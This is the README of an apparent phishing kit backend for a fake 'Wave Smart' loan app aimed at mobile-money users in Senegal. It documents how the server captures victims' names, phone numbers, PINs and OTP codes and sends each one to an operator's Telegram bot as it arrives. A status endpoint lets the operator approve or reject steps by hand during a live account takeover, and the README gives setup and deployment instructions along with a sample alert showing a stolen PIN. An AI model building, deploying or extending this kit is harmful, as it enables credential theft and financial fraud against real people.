# Wave Smart Backend

Node.js/Express backend for the **Wave Smart** loan app.  
Captures login attempts, OTP codes, and loan applications — and fires **Telegram bot alerts** in real time.

---

## Features

| Event | Telegram Alert |
|---|---|
| 🔐 Login attempt (phone + PIN) | ✅ Instant alert with name, phone, PIN, IP |
| 📟 OTP code entered | ✅ Alert with full session details + OTP |
| 💰 Loan application submitted | ✅ Alert with amount, duration, income |
| ✅ Server startup | ✅ Confirmation message |

---

## Quick Start

### 1. Install dependencies
```bash
npm install
```

### 2. Configure environment
```bash
cp .env.example .env
```
Edit `.env` and fill in your values:

```env
TELEGRAM_BOT_TOKEN=123456789:ABCDefGhIJKlmNoPQRsTUVwxyZ
TELEGRAM_CHAT_ID=987654321
PORT=3000
ADMIN_SECRET=your_secret_here
FRONTEND_ORIGIN=*
```

### 3. Get your Telegram credentials

**Bot Token:**
1. Open Telegram → search `@BotFather`
2. Send `/newbot` and follow the steps
3. Copy the token it gives you

**Chat ID:**
1. Search `@userinfobot` on Telegram
2. Send `/start` — it replies with your Chat ID
3. For a group: add `@userinfobot` to the group and send `/start`

### 4. Start the server
```bash
# Production
npm start

# Development (auto-restart on file changes)
npm run dev
```

---

## API Endpoints

### `POST /api`

Unified action endpoint called by the frontend.

#### `action=login_attempt`
```json
{
  "action": "login_attempt",
  "firstName": "Amadou",
  "lastName": "Diallo",
  "phone": "771234567",
  "pin": "1234"
}
```
**Response:**
```json
{ "success": true, "data": { "sessionId": "uuid-here" } }
```
**Triggers:** Telegram alert with name, phone, PIN, IP, timestamp.

---

#### `action=otp_entered`
```json
{
  "action": "otp_entered",
  "sessionId": "uuid-here",
  "otp": "12345"
}
```
**Response:**
```json
{ "success": true }
```
**Triggers:** Telegram alert with full session + OTP code.

---

#### `action=loan_application`
```json
{
  "action": "loan_application",
  "firstName": "Amadou",
  "lastName": "Diallo",
  "phone": "771234567",
  "amount": "500000",
  "duration": "12",
  "income": "200000",
  "monthly": "42930"
}
```
**Triggers:** Telegram alert with loan details.

---

### `GET /api?action=check_status&sessionId=UUID`

Polled by the frontend to check if a session has been actioned.

**Response:**
```json
{ "success": true, "status": "pending" }
```

**Possible statuses:**
| Status | Frontend behaviour |
|---|---|
| `pending` | Keep polling |
| `approved` | Advance to OTP screen |
| `wrong_pin` | Show error, clear PIN |
| `wrong_code` | Show error, clear OTP |
| `continue` | Show "insufficient funds" |

---

### `POST /api/set_status`

Manually set a session's status (e.g. from a Telegram bot command or webhook).

```json
{
  "sessionId": "uuid-here",
  "status": "approved",
  "secret": "your_secret_here"
}
```

---

### `GET /api/sessions?secret=your_secret_here`

Lists all active sessions with full captured data.

---

## Connecting to the Frontend

Update the `API` variable at the top of `wave-smart.html`:

```js
var API = 'http://localhost:3000/api';   // local dev
// var API = 'https://your-server.com/api'; // production
```

---

## Deployment

Works on any Node.js host. Recommended:

- **[Railway](https://railway.app)** — free tier, one-click deploy
- **[Render](https://render.com)** — free tier
- **[Heroku](https://heroku.com)**
- **VPS (Ubuntu)** with PM2:

```bash
npm install -g pm2
pm2 start server.js --name wave-smart
pm2 save
pm2 startup
```

---

## Example Telegram Alert

```
🔐 New Login Attempt
━━━━━━━━━━━━━━━━━━━━
👤 Name: Amadou Diallo
📱 Phone: 🇸🇳 +221 77 123 45 67
🔑 PIN: 1234
🕐 Time: 26/02/2026, 14:32:10
🌐 IP: 196.207.xxx.xxx
🆔 Session: a1b2c3d4…
```

---

## Security Notes

- In production, set `FRONTEND_ORIGIN` to your exact frontend domain
- Change `ADMIN_SECRET` to a strong random string
- Consider rate-limiting with `express-rate-limit` for production use
- Add HTTPS via a reverse proxy (nginx / Cloudflare)
